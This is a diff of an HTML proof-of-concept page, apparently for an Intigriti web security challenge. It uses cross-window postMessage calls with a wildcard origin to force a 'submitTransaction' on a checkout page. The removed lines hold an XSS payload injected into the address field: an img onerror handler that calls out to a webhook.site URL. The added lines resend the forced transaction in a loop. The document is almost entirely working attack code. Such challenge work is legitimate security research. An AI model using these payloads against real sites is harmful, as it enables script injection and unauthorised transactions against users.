@@ -6,43 +6,60 @@
   <body>
     <h1>OOO PoC OOO</h1>
 <script>
-document.addEventListener('DOMContentLoaded', () => {
-  const iframe = document.getElementById('checkoutFrame');
+  
+// setTimeout(() => {
+//     window.opener.postMessage({
+//       type: 'submitTransaction',
+//       transaction: {
+//         currency: '1337COIN',
+//         amount: 0,
+//         toAddress: '1d5b50c72f40a62df2df484770237f4c35'
+//       }
+//     }, '*');
+//   }, 10);
+  
+// const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001");
 
+// setTimeout(() => {
+//   win.postMessage({
+//     type: "submitTransaction",
+//     transaction: {
+//           currency: "1337COIN",
+//           amount: 10,
+//           toAddress: "1d5b50c72f40a62df2df484770237f4c35"
+//     }
+//   }, "*");
+// }, 300);
 
-  setTimeout(() => {
-    iframe.contentWindow.postMessage({
-      type: 'submitTransaction',
-      transaction: {
-        currency: '1337COIN',
-        amount: 0,
-        toAddress: '"><img src=x onerror=fetch("https://webhook.site/b9386d0b-c63f-4066-b155-83a22d1c7055/XSSIsHere")> <span"'
-      }
-    }, '*');
-  }, 10);
-});
-const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001");
+const win = window.open(
+  "https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001"
+);
 
-setTimeout(() => {
-  win.postMessage({
-    type: "submitTransaction",
-    transaction: {
-          currency: "1337COIN",
-          amount: 10,
-          toAddress: "1d5b50c72f40a62df2df484770237f4c35"
-    }
-  }, "*");
-}, 300);
+const payload = {
+  type: "submitTransaction",
+  transaction: {
+    currency: "1337COIN",
+    amount: 10,
+    toAddress: "1d5b50c72f40a62df2df484770237f4c35"
+  }
+};
 
+const interval = setInterval(() => {
+  if (!win || win.closed) {
+    clearInterval(interval);
+    return;
+  }
+  win.postMessage(payload, "*");
+}, 500);
 
 
 
 </script>
 
-<iframe
+<!-- <iframe
   id="checkoutFrame"
   src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001">
-</iframe>
+</iframe> -->
 
 
     
